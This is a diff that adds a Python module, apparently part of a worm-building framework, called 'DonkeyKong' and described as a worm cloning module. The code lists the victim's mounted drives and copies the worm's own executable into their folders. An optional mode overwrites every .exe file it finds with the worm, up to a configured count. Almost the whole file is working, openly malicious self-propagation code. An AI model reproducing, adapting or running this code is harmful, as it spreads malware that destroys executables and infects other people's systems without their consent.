@@ -1,0 +1,99 @@
+#!name##DonkeyKong
+#!types##module
+#!info##A simple worm cloning module. It searches the victim's computer for network drives and tries to clone itself there.
+#!system_FLAG##[W]
+#!reqVar##DK_clone_num##Number of copies of the worm to be made##str
+#!setVar##DK_clone_num##3##str
+#!reqVar##DK_clone_replace##Using an additional method that finds exe files and tries to replace them with a worm file.##str
+#!setVar##DK_clone_replace##False##str
+#!reqVar##DK_pause_start##Module start delay time given in seconds.##str
+#!setVar##DK_pause_start##1##str
+
+
+import psutil
+import os
+import shutil
+import sys
+import threading
+from time import sleep
+
+class DonkeyKong:
+    MTYPES = "mal"
+    def __init__(self, worm: object):
+        self.name = "DonkeyKong"
+        self.worm = worm
+        self.ignore_device = ["A", "B", "C", "D", "E", "F"]
+        self.worm_path = os.path.abspath(sys.argv[0])
+        self.worm_path_name = os.path.basename(self.worm_path)
+        self.victims = []
+        self.replace_method = {{DK_clone_replace}}
+        self.clone_num = {{DK_clone_num}}
+        self.pause = {{DK_pause_start}}
+    
+    def find_drive(self) -> list:
+        drivers = []
+        for disk in psutil.disk_partitions(all=True):
+            if disk.mountpoint.rstrip(":\\") in self.ignore_device:
+                continue
+            else:
+                drivers.append(disk.mountpoint)
+        return drivers
+    
+    def clone_me(self, target: str) -> bool:
+        try:
+            shutil.copy2(self.worm_path, target)
+            return True
+        except:
+            return False
+    
+    def _find_victims(self) -> None:
+        victims = set()
+        for loc in self.find_drive():
+            for root, dirs, files in os.walk(loc):
+                for f in files:
+                    if os.path.splitext(f)[1] == ".exe":
+                        victims.add(os.path.join(root, f))
+        for v in victims:
+            print(v)
+        c = 0
+        for v in victims:
+            if self.clone_me(v):
+                c += 1
+            if c == self.clone_num:
+                break
+
+            
+    def find_victims(self) -> None:
+        fv = threading.Thread(target=self._find_victims)
+        fv.start()
+    
+    def _cloning(self, targets: list) -> None:
+        c = 0
+        for loc in targets:
+            for root, dirs, files in os.walk(loc):
+                if self.clone_me(os.path.join(root, self.worm_path_name)):
+                    c += 1
+                if c == self.clone_num:
+                    break
+    
+    def cloning(self) -> None:
+        targets = self.find_drive()
+        clone = threading.Thread(target=self._cloning, args=(targets, ))
+        clone.start()
+    
+    def spread(self) -> None:
+        self.cloning()
+        if self.replace_method:
+            self.find_victims()
+
+    def start(self) -> None:
+        sleep(self.pause)
+        self.spread()
+
+
+
+
+
+
+
+
